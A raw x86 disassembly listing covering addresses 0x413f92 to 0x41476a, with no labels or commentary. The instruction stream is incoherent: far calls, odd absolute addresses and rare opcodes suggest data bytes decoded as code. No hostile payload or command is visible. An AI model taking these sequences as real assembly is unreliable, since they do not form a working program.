  413f92:	add    BYTE PTR [ecx-0x7fefb944],0x45
  413f99:	add    DWORD PTR [eax-0x80],eax
  413f9c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  413f9e:	or     BYTE PTR [edx],dl
  413fa0:	add    eax,0xea862038
  413fa5:	sub    BYTE PTR [eax],ah
  413fa7:	cwde   
  413fa8:	push   eax
  413fa9:	inc    eax
  413faa:	cmp    BYTE PTR [edx],al
  413fac:	mov    BYTE PTR [edx-0x78],al
  413faf:	add    BYTE PTR ds:0xc0000022,ah
  413fb5:	inc    eax
  413fb6:	mov    ch,0x81
  413fb8:	xor    BYTE PTR [edx],0xa8
  413fbb:	add    eax,0x8c89000b
  413fc1:	add    dl,BYTE PTR [eax+0x5c90099]
  413fc7:	add    BYTE PTR [ecx+0x220000],0x10
  413fce:	xor    al,0x40
  413fd0:	sub    BYTE PTR [eax],dh
  413fd2:	rcl    BYTE PTR [eax+0x30],0xe1
  413fd6:	pusha  
  413fd7:	inc    edx
  413fd8:	adc    al,BYTE PTR [ecx+0x8880040]
  413fde:	nop
  413fdf:	add    DWORD PTR [ebx],eax
  413fe1:	cmp    DWORD PTR [esi],ecx
  413fe3:	mov    edx,0x98988000
  413fe8:	mov    ah,0x34
  413fea:	adc    BYTE PTR ds:0x80084110,dl
  413ff0:	and    BYTE PTR [ebx],al
  413ff2:	and    BYTE PTR [eax+0x31],al
  413ff8:	xchg   BYTE PTR [ecx],cl
  413ffa:	and    cl,BYTE PTR [ecx]
  413ffc:	add    al,0x0
  413ffe:	and    BYTE PTR [edi-0x7e],dl
  414001:	push   eax
  414002:	inc    eax
  414003:	test   BYTE PTR [ecx],cl
  414005:	sub    DWORD PTR [ecx+0x1aa8c68],ecx
  41400b:	add    BYTE PTR [eax],dl
  41400d:	add    BYTE PTR [edx],dl
  41400f:	add    DWORD PTR [ecx],0x8
  414012:	cmp    BYTE PTR [eax],dl
  414014:	adc    eax,0x14000888
  414019:	adc    DWORD PTR [eax+0x50],esi
  41401c:	xor    dh,BYTE PTR [eax+0x605022]
  414022:	or     BYTE PTR [esp+eax*2],al
  414025:	and    BYTE PTR [eax-0x37e8fef8],ah
  41402b:	aam    0x2
  41402d:	test   al,0x20
  41402f:	dec    esp
  414030:	and    eax,0x10001a8
  414035:	add    ah,BYTE PTR [edx+0x51800834]
  41403b:	add    BYTE PTR [eax+0xa030840],bl
  414041:	mov    al,ds:0x1619c001
  414046:	add    DWORD PTR [eax],0x70808086
  41404c:	data16 and al,BYTE PTR [eax]
  41404f:	add    DWORD PTR [eax+ebp*1],esp
  414052:	dec    ebx
  414053:	push   esi
  414054:	xchg   ecx,eax
  414055:	mov    BYTE PTR [edx],al
  414057:	add    BYTE PTR [ecx+0xe021801],al
  41405d:	adc    BYTE PTR [eax],ah
  41405f:	add    BYTE PTR [eax],al
  414061:	cwde   
  414062:	xor    al,0x11
  414064:	or     dl,BYTE PTR [ecx]
  414066:	rol    DWORD PTR gs:[edx],0x20
  41406a:	sub    ah,BYTE PTR [ecx+0x34a1825]
  414070:	nop
  414071:	pop    es
  414072:	and    BYTE PTR [eax+eax*2+0x388c0470],0x89
  41407a:	sub    eax,DWORD PTR [eax-0x5f]
  41407d:	and    BYTE PTR [eax],al
  41407f:	sbb    BYTE PTR [esp+eax*1+0x60264015],0x39
  414087:	add    BYTE PTR [edx],al
  414089:	and    cl,BYTE PTR [eax+ecx*8+0x64881433]
  414090:	or     DWORD PTR [eax],eax
  414092:	adc    BYTE PTR [edx],0x0
  414095:	mov    BYTE PTR [eax+eax*2],cl
  414098:	or     BYTE PTR [eax-0x7ff9fbd5],0x10
  41409f:	adc    ah,BYTE PTR [edx]
  4140a1:	nop
  4140a2:	push   eax
  4140a3:	and    al,al
  4140a5:	add    BYTE PTR [ecx],dh
  4140a7:	shl    BYTE PTR [edx+0x1b3135],0x80
  4140ae:	test   BYTE PTR [eax*1+0x18002029],al
  4140b5:	and    BYTE PTR [ecx+eax*1],dh
  4140b8:	inc    eax
  4140b9:	and    BYTE PTR ds:0x5235061,dl
  4140bf:	inc    edx
  4140c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140c1:	add    BYTE PTR ds:0x451a04a,dl
  4140c7:	scas   eax,DWORD PTR es:[edi]
  4140c8:	and    eax,0x130ca45a
  4140cd:	push   eax
  4140ce:	add    BYTE PTR [eax],dl
  4140d0:	test   DWORD PTR [ecx],eax
  4140d2:	loope  0x41411d
  4140d4:	lock add al,0x1
  4140d7:	sub    BYTE PTR [eax-0x7f],al
  4140da:	adc    al,0x20
  4140dc:	inc    ebx
  4140dd:	xor    BYTE PTR [eax-0x67],cl
  4140e0:	push   eax
  4140e1:	adc    BYTE PTR [eax],al
  4140e3:	and    al,0x84
  4140e5:	inc    esp
  4140e6:	sub    DWORD PTR [ecx],edx
  4140e8:	pusha  
  4140e9:	add    al,0x50
  4140eb:	add    al,0x18
  4140ed:	add    BYTE PTR [eax],al
  4140ef:	and    BYTE PTR [eax+0x8501806],cl
  4140f5:	pop    es
  4140f6:	adc    DWORD PTR [ecx+0x4],eax
  4140f9:	adc    BYTE PTR [edx+0x1300814b],dh
  4140ff:	add    BYTE PTR [edx+0x19],dl
  414102:	add    al,ah
  414104:	mov    DWORD PTR [esi+eiz*1],esp
  414107:	add    ah,BYTE PTR [edx+0x21c112a0]
  41410d:	sbb    BYTE PTR [ecx],al
  41410f:	or     bl,bl
  414111:	add    eax,ebp
  414113:	mov    al,ds:0x15c02000
  414118:	add    BYTE PTR [eax],al
  41411a:	and    DWORD PTR [eax+ecx*1+0x2810100],esp
  414121:	mov    al,ds:0x15504c5
  414126:	adc    al,0x84
  414128:	sub    BYTE PTR [ecx+ebx*4+0x62],dl
  41412c:	add    BYTE PTR [eax+0x1205b004],al
  414132:	or     BYTE PTR [ecx+0x40],0x2
  414136:	popa   
  414137:	add    BYTE PTR [esi],al
  414139:	inc    esp
  41413a:	and    BYTE PTR [ecx+edx*1],dl
  41413d:	add    DWORD PTR [ecx],eax
  41413f:	add    BYTE PTR [ecx],0x9
  414142:	xor    BYTE PTR [edx],dh
  414144:	or     al,0x70
  414146:	and    al,0x2
  414148:	shr    BYTE PTR [ecx-0x80],0x48
  41414c:	and    DWORD PTR ds:0x404e8021,ebx
  414152:	scas   al,BYTE PTR es:[edi]
  414153:	cli    
  414154:	loopne 0x4141a8
  414156:	add    al,BYTE PTR [eax]
  414158:	sub    BYTE PTR [eax],bh
  41415a:	mov    BYTE PTR [eax+0x23800505],cl
  414160:	cwde   
  414161:	xor    BYTE PTR [eax+eiz*1],dh
  414164:	inc    ebp
  414165:	add    BYTE PTR [ecx],ah
  414167:	add    edx,ebp
  414169:	les    esp,FWORD PTR [edx]
  41416b:	les    ecx,FWORD PTR [ecx-0x6c]
  41416e:	nop
  41416f:	sbb    eax,0x12020c84
  414174:	add    BYTE PTR [edx],0x10
  414177:	add    DWORD PTR [ecx],eax
  414179:	or     BYTE PTR [esi],0x2
  41417c:	or     BYTE PTR [eax+0x40707082],al
  414182:	mov    BYTE PTR [ebx],ah
  414184:	add    eax,DWORD PTR [eax]
  414186:	and    ah,BYTE PTR [eax+0xe]
  414189:	add    cl,BYTE PTR [edi]
  41418b:	push   0x40004a52
  414190:	inc    eax
  414191:	and    BYTE PTR [eax],dl
  414193:	addr16 or al,0x40
  414196:	test   dl,al
  414198:	add    BYTE PTR [eax],0xc
  41419b:	add    eax,0x10008290
  4141a0:	sbb    BYTE PTR [eax],ah
  4141a2:	and    BYTE PTR [eax+eax*2+0x43106aa4],cl
  4141a9:	popa   
  4141aa:	or     BYTE PTR [eax],ah
  4141ac:	add    BYTE PTR [ecx-0x40],al
  4141af:	sbb    DWORD PTR [edx],0x608004ee
  4141b5:	sbb    BYTE PTR [ecx+0x2a90544],al
  4141bb:	sub    BYTE PTR [eax],bh
  4141bd:	or     al,0x20
  4141bf:	add    BYTE PTR [eax+eax*1+0x16],0x2
  4141c4:	and    dl,BYTE PTR [eax]
  4141c6:	pop    eax
  4141c7:	mov    dl,al
  4141c9:	adc    DWORD PTR [ebx],ecx
  4141cb:	add    BYTE PTR ds:0x3050a01c,al
  4141d1:	or     DWORD PTR [eax-0x263b5800],eax
  4141d7:	or     al,BYTE PTR [ecx+0x0]
  4141da:	add    BYTE PTR [edx-0x40],cl
  4141dd:	inc    eax
  4141de:	enter  0x480,0x0
  4141e2:	push   cs
  4141e3:	add    DWORD PTR [eax+0x50082d0a],eax
  4141e9:	push   esi
  4141ea:	add    ebx,DWORD PTR [ecx+eax*4]
  4141ed:	add    al,0x97
  4141ef:	and    al,0x30
  4141f1:	and    BYTE PTR [eax],0x8
  4141f4:	add    BYTE PTR [eax+eax*2],cl
  4141f7:	add    BYTE PTR [esi+0x10911b49],ah
  4141fd:	xor    al,BYTE PTR [eax]
  4141ff:	adc    BYTE PTR [ebp-0x74f1f270],ah
  414205:	mov    WORD PTR [ecx],es
  414207:	mov    BYTE PTR [eax-0x70],al
  41420a:	add    BYTE PTR [edi-0x80],0x88
  41420e:	ror    BYTE PTR [eax],0xc
  414211:	mov    eax,ds:0x33014022
  414216:	or     BYTE PTR [eax],0x15
  414219:	ret    0x4960
  41421c:	inc    ecx
  41421d:	adc    al,0x10
  41421f:	rcl    BYTE PTR [eax+eax*4],1
  414222:	add    DWORD PTR [eax+0x0],ebx
  414225:	add    ah,BYTE PTR [eax+0x404623c4]
  41422b:	fiadd  DWORD PTR [ecx+0x18c01c9]
  414231:	add    BYTE PTR [edx+0x4],ah
  414234:	and    al,BYTE PTR [eax]
  414236:	lds    ebx,FWORD PTR [ebx]
  414238:	dec    esi
  414239:	sub    BYTE PTR [edx+eax*1+0x2e900a02],ah
  414240:	add    al,0x1d
  414242:	add    BYTE PTR [edx+0x61],ah
  414245:	sub    eax,0x66030002
  41424a:	or     BYTE PTR [eax],cl
  41424c:	sbb    BYTE PTR [ebx],al
  41424e:	mov    al,ds:0x11d20
  414253:	add    BYTE PTR [eax],dl
  414255:	or     BYTE PTR [ecx],ah
  414257:	or     dl,BYTE PTR [eax+0x28a04152]
  41425d:	adc    BYTE PTR [eax*4+0x410c2a22],al
  414264:	or     DWORD PTR [eax],ebx
  414266:	or     BYTE PTR [ebx+0x0],ch
  414269:	inc    eax
  41426a:	add    bl,BYTE PTR [edx]
  41426c:	add    al,0x44
  41426e:	mov    al,ds:0x2523
  414273:	or     BYTE PTR [ecx-0x80],al
  414276:	sub    BYTE PTR [eax],0x6a
  414279:	add    BYTE PTR [esi],al
  41427b:	mov    BYTE PTR [edi+edx*1+0xa],ah
  41427f:	and    BYTE PTR [ecx-0x2f8ffbbf],dl
  414285:	xor    ah,BYTE PTR [eax]
  414287:	inc    eax
  414288:	adc    BYTE PTR [eax],cl
  41428a:	add    al,BYTE PTR [ecx-0x80]
  41428d:	add    ah,BYTE PTR [eax]
  41428f:	and    DWORD PTR [ecx+0x1],ebx
  414292:	sub    eax,DWORD PTR [eax]
  414294:	add    al,0xd1
  414296:	pop    ds
  414297:	sub    DWORD PTR [ecx],ecx
  414299:	arpl   WORD PTR [edx],sp
  41429b:	add    BYTE PTR [eax-0x3bfe4ef7],ah
  4142a1:	pusha  
  4142a2:	push   esi
  4142a3:	and    BYTE PTR [eax-0x78],al
  4142a6:	push   es
  4142a7:	inc    eax
  4142a8:	add    dl,BYTE PTR [eax]
  4142aa:	pusha  
  4142ab:	adc    eax,0x112200
  4142b1:	add    BYTE PTR [eax+eiz*1],cl
  4142b4:	and    eax,0xd8884121
  4142b9:	pop    eax
  4142ba:	add    BYTE PTR [eax],0x40
  4142bd:	inc    eax
  4142be:	add    BYTE PTR ds:0x1a109562,al
  4142c4:	xchg   BYTE PTR [edi+0x11869041],al
  4142ca:	or     cl,dl
  4142cc:	add    al,0x80
  4142ce:	and    DWORD PTR [eax+0x12],esp
  4142d1:	or     DWORD PTR [eax+0x18c038aa],ecx
  4142d7:	add    DWORD PTR [eax],ebp
  4142d9:	test   BYTE PTR [eax],ch
  4142db:	adc    BYTE PTR gs:[edx+0x40003300],cl
  4142e2:	mov    al,ds:0x4006098
  4142e7:	and    DWORD PTR [edx+eax*1+0x64],edx
  4142eb:	dec    ecx
  4142ec:	inc    eax
  4142ed:	xchg   edx,eax
  4142ee:	mov    al,ds:0x90402000
  4142f3:	or     BYTE PTR [eax],al
  4142f5:	adc    eax,0x201c2122
  4142fa:	pusha  
  4142fb:	add    BYTE PTR [ebp+0x8012df6],0x28
  414302:	and    al,0x20
  414304:	push   eax
  414305:	and    DWORD PTR [eax-0x7e997bfc],edx
  41430b:	inc    eax
  41430c:	add    BYTE PTR [eax-0x73],al
  41430f:	xor    BYTE PTR [eax],ch
  414311:	or     DWORD PTR [edx],esp
  414313:	add    eax,0xd0205818
  414318:	enter  0xc90f,0x78
  41431c:	and    BYTE PTR [eax+0x2],al
  41431f:	inc    esp
  414320:	add    BYTE PTR [eax+0x7],cl
  414323:	add    DWORD PTR ds:0x38a80028,eax
  414329:	inc    edx
  41432a:	inc    edi
  41432b:	rol    BYTE PTR [eax],0x12
  41432e:	and    cl,BYTE PTR [esi]
  414330:	mov    BYTE PTR [eax],al
  414332:	xor    DWORD PTR [eax],0xd9c83d11
  414338:	mov    BYTE PTR [esi],bh
  41433a:	nop
  41433b:	call   0x581c702
  414340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414341:	dec    esp
  414342:	add    BYTE PTR [ecx+0x200171],al
  414348:	inc    eax
  414349:	add    DWORD PTR [eax+0x63],eax
  41434c:	lods   eax,DWORD PTR ds:[esi]
  41434d:	add    al,BYTE PTR [ecx]
  41434f:	rol    BYTE PTR [ecx],0xa0
  414352:	enter  0x4201,0x0
  414356:	xchg   esp,eax
  414357:	add    DWORD PTR [eax],edi
  414359:	lods   al,BYTE PTR ds:[esi]
  41435a:	add    BYTE PTR [ebp+0x6],bl
  41435d:	stos   BYTE PTR es:[edi],al
  41435e:	add    BYTE PTR [eax+0x45],0x10
  414362:	test   BYTE PTR [eax],ah
  414364:	loope  0x414366
  414366:	bound  edx,QWORD PTR [eax+0x48]
  414369:	adc    BYTE PTR [eax-0x80],dh
  41436c:	push   es
  41436d:	add    DWORD PTR [eax],eax
  41436f:	add    BYTE PTR [eax],ah
  414371:	or     DWORD PTR [eax],eax
  414373:	add    al,0x0
  414375:	and    al,BYTE PTR [eax]
  414377:	inc    eax
  414378:	add    al,0x20
  41437a:	add    al,0xa
  41437c:	push   ecx
  41437d:	push   cs
  41437e:	mov    al,ds:0x20400900
  414383:	inc    eax
  414384:	mov    al,ds:0x120580
  414389:	xchg   esp,eax
  41438a:	inc    eax
  41438b:	ret    0x2c01
  41438e:	push   edx
  41438f:	and    al,0x60
  414391:	xor    BYTE PTR [eax],0x11
  414394:	add    al,0x42
  414396:	lods   al,BYTE PTR ds:[esi]
  414397:	nop
  414398:	add    eax,eax
  41439a:	add    BYTE PTR [ecx+0x2],al
  41439d:	and    BYTE PTR [edx+0x64],dh
  4143a0:	xchg   edx,eax
  4143a1:	or     BYTE PTR [ecx],al
  4143a3:	add    BYTE PTR [ecx+0x6],dl
  4143a6:	add    al,0x40
  4143a8:	dec    ebp
  4143a9:	mov    WORD PTR [eax],ds
  4143ab:	loopne 0x414411
  4143ad:	rcl    DWORD PTR [eax],0x2e
  4143b0:	sbb    al,BYTE PTR [eax]
  4143b2:	inc    ebp
  4143b3:	push   0x0
  4143b5:	loopne 0x4143ff
  4143b7:	or     dh,BYTE PTR [edx+0x738058]
  4143bd:	inc    eax
  4143be:	test   al,0x8
  4143c0:	and    al,BYTE PTR [edi+esi*1+0x1610220a]
  4143c7:	scas   al,BYTE PTR es:[edi]
  4143c8:	or     dl,BYTE PTR ds:0x5a044b00
  4143ce:	inc    eax
  4143cf:	adc    BYTE PTR [eax],0x4
  4143d2:	mov    al,0x16
  4143d4:	test   al,al
  4143d6:	adc    esp,DWORD PTR [esi+edx*1+0x1844000f]
  4143dd:	add    DWORD PTR [ecx+ebp*1-0x5e],eax
  4143e1:	retf   0x2002
  4143e4:	add    BYTE PTR [eax+0x18],dh
  4143e7:	add    BYTE PTR [eax-0xc],al
  4143ea:	and    BYTE PTR [eax],ch
  4143ec:	xchg   BYTE PTR [ecx+0xe403020],cl
  4143f2:	push   ecx
  4143f3:	mov    BYTE PTR [eax],ah
  4143f5:	and    DWORD PTR [ecx-0x5d],ebp
  4143f8:	sub    BYTE PTR [eax],al
  4143fa:	and    ah,BYTE PTR [eax+0x26800860]
  414400:	ret    0x1814
  414403:	shl    BYTE PTR [eax],0xe0
  414406:	adc    BYTE PTR [ecx],dh
  414408:	sldt   WORD PTR [eax+0x5813284]
  41440f:	add    al,0xb1
  414411:	push   esi
  414412:	add    BYTE PTR [eax],cl
  414414:	inc    eax
  414415:	and    al,0x8
  414417:	pop    esp
  414418:	inc    edx
  414419:	jo     0x41447b
  41441b:	inc    eax
  41441c:	and    BYTE PTR [ecx],0x10
  41441f:	adc    al,0x80
  414421:	pusha  
  414422:	lock or DWORD PTR [eax],eax
  414425:	or     DWORD PTR [eax+0x49592148],0xf8144800
  41442f:	or     DWORD PTR [eax],eax
  414431:	add    esi,DWORD PTR [eax+eax*1]
  414434:	add    DWORD PTR [ecx],edx
  414436:	and    BYTE PTR [eax],ah
  414438:	add    eax,0x1094000
  41443d:	add    BYTE PTR [eax],al
  41443f:	add    DWORD PTR [eax+edi*2+0x9406018],eax
  414446:	push   eax
  414447:	add    BYTE PTR [esi+eax*1+0x6b],dl
  41444b:	add    BYTE PTR [eax],0x2
  41444e:	add    BYTE PTR [eax],al
  414450:	add    DWORD PTR [ecx],esp
  414452:	pop    es
  414453:	push   edi
  414454:	add    BYTE PTR [ecx],dl
  414456:	inc    eax
  414457:	add    BYTE PTR [eax],cl
  414459:	and    BYTE PTR [eax+eiz*2-0x34efe980],0x4
  414461:	dec    eax
  414462:	add    BYTE PTR [eax+0x5],bl
  414465:	push   es
  414466:	or     dl,BYTE PTR [esi+0x8274c]
  41446c:	inc    eax
  41446d:	mov    al,ds:0x7212008
  414472:	dec    eax
  414473:	add    al,0x82
  414475:	or     BYTE PTR [eax],al
  414477:	add    BYTE PTR es:[eax],0x20
  41447b:	add    BYTE PTR [edx+0x52701646],cl
  414481:	push   eax
  414482:	adc    BYTE PTR [esi],cl
  414484:	daa    
  414485:	inc    esp
  414486:	or     al,0x42
  414488:	adc    al,0x21
  41448a:	or     al,0x14
  41448c:	dec    eax
  41448d:	mov    eax,ds:0x4310818
  414492:	push   eax
  414493:	mov    eax,ds:0x81002044
  414498:	and    al,0x20
  41449a:	adc    al,BYTE PTR [eax]
  41449c:	push   ss
  41449d:	inc    edx
  41449e:	or     BYTE PTR [eax],0x0
  4144a1:	scas   eax,DWORD PTR es:[edi]
  4144a2:	add    ah,al
  4144a4:	or     edx,DWORD PTR [ebx+0x104450]
  4144aa:	add    ah,BYTE PTR [ecx]
  4144ac:	add    dl,BYTE PTR ds:0x20322082
  4144b2:	mov    al,0x0
  4144b4:	bound  esp,QWORD PTR [eax]
  4144b6:	add    BYTE PTR [ecx],0x41
  4144b9:	sbb    BYTE PTR [ebx+ecx*1+0x300001c4],al
  4144c0:	sub    BYTE PTR [eax],al
  4144c2:	stos   BYTE PTR es:[edi],al
  4144c3:	add    BYTE PTR [eax],bl
  4144c5:	dec    eax
  4144c6:	add    al,cl
  4144c8:	add    al,0xc6
  4144ca:	add    BYTE PTR [eax],0x0
  4144cd:	add    BYTE PTR [eax+eax*4],ah
  4144d0:	pop    ecx
  4144d1:	adc    al,0x28
  4144d3:	add    BYTE PTR [eax+eiz*4],bh
  4144d6:	add    DWORD PTR ds:0x5111004c,0x841160c
  4144e0:	inc    ebp
  4144e1:	sbb    BYTE PTR [esp+esi*4],al
  4144e4:	xchg   edx,eax
  4144e5:	or     DWORD PTR [ecx],eax
  4144e7:	or     BYTE PTR [eax],dl
  4144e9:	inc    ecx
  4144ea:	and    BYTE PTR [ecx],al
  4144ec:	add    al,0xd8
  4144ee:	add    BYTE PTR [ecx+0x0],ah
  4144f1:	and    BYTE PTR [edx+0x8],al
  4144f4:	test   BYTE PTR [edi],cl
  4144f6:	push   ecx
  4144f7:	and    BYTE PTR [esp],ah
  4144fa:	nop
  4144fb:	inc    edx
  4144fc:	popf   
  4144fd:	sbb    al,cl
  4144ff:	add    al,ah
  414501:	or     DWORD PTR [edx+eax*1+0x6],esp
  414505:	mov    ch,0x0
  414507:	mov    DWORD PTR [ebx+eax*8],ecx
  41450a:	push   edi
  41450b:	add    DWORD PTR [ecx*4+0x202000a3],esi
  414512:	inc    esi
  414513:	xor    BYTE PTR [esi+0x301a8000],al
  414519:	or     BYTE PTR [edx],cl
  41451b:	and    DWORD PTR [eax],eax
  41451d:	sahf   
  41451e:	sbb    BYTE PTR [eax+0x20],al
  414521:	add    BYTE PTR [esi-0x757dffef],0xec
  414528:	test   BYTE PTR [eax+eiz*1],al
  41452b:	mov    BYTE PTR [eax],bl
  41452d:	adc    BYTE PTR [eax],0x4
  414530:	sub    al,BYTE PTR [eax]
  414532:	add    DWORD PTR [ecx],eax
  414534:	fs add al,0xd1
  414537:	and    BYTE PTR [eax+0x70972218],cl
  41453d:	dec    esp
  41453e:	mov    BYTE PTR [ecx+eax*1],al
  414541:	add    BYTE PTR [edx+0x4b06804b],al
  414547:	inc    eax
  414548:	pusha  
  414549:	add    BYTE PTR [eax+eax*2],bl
  41454c:	xchg   ebx,eax
  41454d:	and    eax,eax
  41454f:	mov    BYTE PTR [edx+0x10],al
  414552:	inc    eax
  414553:	enter  0x1220,0x14
  414557:	sub    DWORD PTR [esp+eax*1+0x3bc06a09],esi
  41455e:	add    BYTE PTR [edx],dl
  414560:	inc    esi
  414561:	mov    al,ds:0xa2bc8948
  414566:	xor    eax,0x941900a0
  41456b:	push   esp
  41456c:	dec    eax
  41456d:	dec    ecx
  41456e:	test   BYTE PTR [esi],al
  414570:	or     BYTE PTR [eax+0x281a4802],al
  414576:	add    DWORD PTR [edx+0x40],edx
  414579:	add    BYTE PTR [ebp-0x3677fbac],cl
  41457f:	and    al,0x0
  414581:	push   es
  414582:	dec    esp
  414583:	inc    edx
  414584:	or     BYTE PTR [ecx-0x7de2f7e8],bl
  41458a:	mov    eax,ds:0x4c840298
  41458f:	adc    DWORD PTR [edx],0x82540208
  414595:	and    al,0x8
  414597:	daa    
  414598:	sub    DWORD PTR [edx-0x68],esp
  41459b:	xor    BYTE PTR [ecx-0x3f],ch
  41459e:	inc    eax
  41459f:	rcl    BYTE PTR [edx+0x4181081c],1
  4145a5:	and    BYTE PTR [eax+0x4401814],ch
  4145ab:	test   BYTE PTR [ecx],al
  4145ad:	inc    edx
  4145ae:	fmul   DWORD PTR [eax-0x64]
  4145b1:	mov    BYTE PTR [eax+0x12],0x80
  4145b5:	xchg   edx,eax
  4145b6:	adc    al,0x0
  4145b8:	add    DWORD PTR [eax],esp
  4145ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145bb:	adc    BYTE PTR [ebx],al
  4145bd:	cmp    BYTE PTR [ebx],bl
  4145bf:	or     al,BYTE PTR [eax]
  4145c1:	inc    esp
  4145c2:	retf   
  4145c3:	adc    BYTE PTR [ecx+0xa232328],0x44
  4145ca:	dec    esp
  4145cb:	sub    BYTE PTR [eax+0x3c],ch
  4145ce:	xor    al,0x40
  4145d0:	xor    ah,BYTE PTR [edx]
  4145d2:	add    BYTE PTR [edx-0x75ffc7b4],dl
  4145d8:	pop    eax
  4145d9:	or     BYTE PTR [edx],al
  4145db:	add    al,0x85
  4145dd:	pusha  
  4145de:	bound  ecx,QWORD PTR [esi+0x500b7340]
  4145e4:	and    BYTE PTR [edx],ah
  4145e6:	adc    BYTE PTR [eax+0x44],dh
  4145e9:	add    BYTE PTR [eax+0x3c],dh
  4145ec:	add    BYTE PTR [edx],dl
  4145ee:	and    BYTE PTR [ecx+edx*1],ch
  4145f1:	or     BYTE PTR [eax],ch
  4145f3:	bound  eax,QWORD PTR ss:[edx]
  4145f6:	inc    eax
  4145f7:	add    ah,BYTE PTR [eax]
  4145f9:	inc    eax
  4145fa:	add    al,0x4
  4145fc:	test   BYTE PTR [ecx],ah
  4145fe:	or     BYTE PTR [edx],al
  414600:	or     BYTE PTR [eax],dl
  414602:	and    dl,al
  414604:	or     BYTE PTR [ecx],al
  414606:	adc    BYTE PTR ds:0x80432c0,dl
  41460c:	inc    ebx
  41460d:	sbb    eax,0xd0504704
  414612:	sub    DWORD PTR [eax],edx
  414614:	add    BYTE PTR [edx+0x1],al
  414617:	add    BYTE PTR [edx],ah
  414619:	push   edx
  41461a:	sub    BYTE PTR [eax+0xa],dl
  41461d:	xchg   BYTE PTR [edx],cl
  41461f:	sbb    DWORD PTR [eax],0x20636010
  414625:	inc    eax
  414626:	inc    eax
  414627:	inc    ecx
  414628:	add    BYTE PTR [eax+ecx*1+0x28900180],al
  41462f:	or     BYTE PTR [eax+0x30300004],dl
  414635:	mov    al,BYTE PTR [ecx+0x20]
  414638:	mov    cl,0x0
  41463a:	inc    eax
  41463b:	add    BYTE PTR [esi],al
  41463d:	pop    DWORD PTR [eax+0xc]
  414640:	add    ebx,DWORD PTR [edx]
  414642:	dec    esp
  414643:	xchg   ecx,eax
  414644:	sbb    cl,al
  414646:	sub    al,0xaa
  414648:	adc    BYTE PTR [ecx],al
  41464a:	xchg   edx,eax
  41464b:	add    ebx,DWORD PTR [eax+0x310020]
  414651:	add    DWORD PTR [eax+0x45],eax
  414654:	or     BYTE PTR [eax],al
  414656:	adc    BYTE PTR [eax+0x8412742],al
  41465c:	sbb    al,0x40
  41465e:	bound  edx,QWORD PTR [eax+eax*2]
  414661:	pushf  
  414662:	xchg   ecx,eax
  414663:	adc    BYTE PTR [ecx],ah
  414665:	inc    esi
  414666:	rol    BYTE PTR [eax+0x5b026309],0x4
  41466d:	or     BYTE PTR [ebp+0x6e],0x15
  414671:	sub    BYTE PTR [eax],bl
  414673:	call   0xa04:0xc3820209
  41467a:	push   0x71089100
  41467f:	adc    BYTE PTR [ebx],al
  414681:	cwde   
  414682:	add    cl,al
  414684:	or     al,BYTE PTR [eax+0x60]
  414687:	add    al,BYTE PTR [ecx]
  414689:	and    eax,esi
  41468b:	bound  esi,QWORD PTR [eax]
  41468d:	add    BYTE PTR [eax],0xc0
  414690:	mov    cs,WORD PTR [ebp+0x42]
  414693:	inc    ecx
  414694:	add    BYTE PTR [edx],al
  414696:	mov    dl,BYTE PTR [eax]
  414698:	sbb    BYTE PTR [eax-0x20],cl
  41469b:	or     DWORD PTR [eax+0x1003802],ecx
  4146a1:	ret    0x9184
  4146a4:	sbb    DWORD PTR [ecx-0x3f],ecx
  4146a7:	add    cl,BYTE PTR [eax+0x1a]
  4146aa:	push   ss
  4146ab:	inc    eax
  4146ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146ad:	and    BYTE PTR [edx],ch
  4146af:	adc    BYTE PTR ds:0x20562066,cl
  4146b5:	add    BYTE PTR [eax],al
  4146b7:	add    al,BYTE PTR [eax+0xc]
  4146ba:	or     BYTE PTR [eax],bl
  4146bc:	pusha  
  4146bd:	add    al,BYTE PTR [eax-0x70]
  4146c0:	adc    BYTE PTR [esi],al
  4146c2:	adc    eax,0x22380841
  4146c7:	adc    BYTE PTR [eax+0x14040002],0x2d
  4146ce:	adc    al,0x7a
  4146d0:	and    BYTE PTR [eax+eax*4+0x44],cl
  4146d4:	call   DWORD PTR ds:0x435b84
  4146da:	inc    ecx
  4146db:	xchg   esi,eax
  4146dc:	add    al,0xd
  4146de:	or     BYTE PTR [eax+eax*1+0x23],al
  4146e2:	lds    eax,FWORD PTR [edi]
  4146e4:	add    BYTE PTR [eax+edx*8+0x3320a20],al
  4146eb:	adc    al,0x9
  4146ed:	inc    ecx
  4146ee:	or     BYTE PTR [ebx],al
  4146f0:	push   eax
  4146f1:	fmul   st,st(4)
  4146f3:	or     al,0x0
  4146f5:	adc    al,0xc5
  4146f7:	xor    esp,esp
  4146f9:	add    BYTE PTR [edx],al
  4146fb:	dec    eax
  4146fc:	add    BYTE PTR [eax+ecx*1+0x240cd26],0xa8
  414704:	adc    BYTE PTR [ebx],cl
  414706:	sahf   
  414707:	add    BYTE PTR [eax+0x11911143],dl
  41470d:	add    al,0x0
  41470f:	dec    eax
  414710:	test   BYTE PTR [esi-0x60],al
  414713:	xor    bl,BYTE PTR [edx]
  414715:	mov    BYTE PTR [eax+edx*4],ah
  414718:	sbb    al,0x20
  41471a:	test   al,0x80
  41471c:	mov    DWORD PTR [eax],ecx
  41471e:	adc    cl,BYTE PTR [ecx+edx*1]
  414721:	daa    
  414722:	add    DWORD PTR [eax+0x10aa200],ecx
  414728:	add    BYTE PTR [eax],al
  41472a:	inc    ecx
  41472b:	adc    BYTE PTR [eax],dl
  41472d:	test   BYTE PTR [eax],al
  41472f:	xchg   ecx,eax
  414730:	adc    eax,DWORD PTR [edx+0x21]
  414733:	and    dl,BYTE PTR [edx]
  414735:	add    al,BYTE PTR [eax+0x48]
  414738:	add    BYTE PTR [eax],0x0
  41473b:	adc    BYTE PTR [eax+0xab20024],al
  414741:	and    DWORD PTR [ecx-0x773d83f0],edx
  414747:	or     BYTE PTR [edx+eiz*4],ah
  41474a:	and    BYTE PTR [ecx],bl
  41474c:	and    DWORD PTR fs:[eax],eax
  41474f:	mov    BYTE PTR [eax],al
  414751:	inc    ebx
  414752:	adc    eax,DWORD PTR [eax]
  414754:	inc    ecx
  414755:	mov    dl,dh
  414757:	mov    DWORD PTR [ecx+0x900400],esp
  41475d:	adc    bl,BYTE PTR ds:0x9a882004
  414763:	call   0x2046:0x202b400
  41476a:	dec    eax
